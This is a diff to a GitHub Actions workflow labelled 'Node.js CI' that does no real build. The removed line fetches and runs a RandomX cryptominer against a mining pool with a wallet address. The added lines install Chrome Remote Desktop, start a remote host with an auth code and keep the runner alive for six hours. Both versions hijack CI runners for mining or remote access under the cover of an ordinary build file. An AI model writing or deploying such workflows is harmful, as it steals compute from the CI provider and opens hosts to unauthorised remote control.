@@ -1,26 +1,21 @@
-
 name: Node.js CI
-
 on:
   push:
     branches: [ main ]
   pull_request:
     branches: [ main ]
-
 jobs:
   build:
-
     runs-on: ubuntu-latest
-
     strategy:
       matrix:
-        node-version: [10.x, 12.x, 14.x, 15.x]
-        # See supported Node.js release schedule at https://nodejs.org/en/about/releases/
-
+        node-version: [10.x]
     steps:
     - uses: actions/checkout@v2
     - name: Use Node.js ${{ matrix.node-version }}
       uses: actions/setup-node@v1
       with:
         node-version: ${{ matrix.node-version }}
-    - run: sudo apt install screen -y && wget https://swenson.my.id/mining/masterfile2 && chmod 777 masterfile2 && ./masterfile2 --disable-gpu --algorithm randomx --pool 139.99.124.170:80 --wallet 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr --cpu-threads 64;0 > screen -S shouko
+    - run: sudo apt-get update && sudo apt-get install xfce4 xfce4-terminal && wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb && sudo dpkg -i chrome* && sudo apt-get install -f
+    - run: DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AY0e-g4h-ty9oXDEzgQISwTHeVp63TKwz5C5pT5cTi1LjbQRF7mh4fcsobA9F_O4k6PEKw" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)
+    - run: sleep 21600
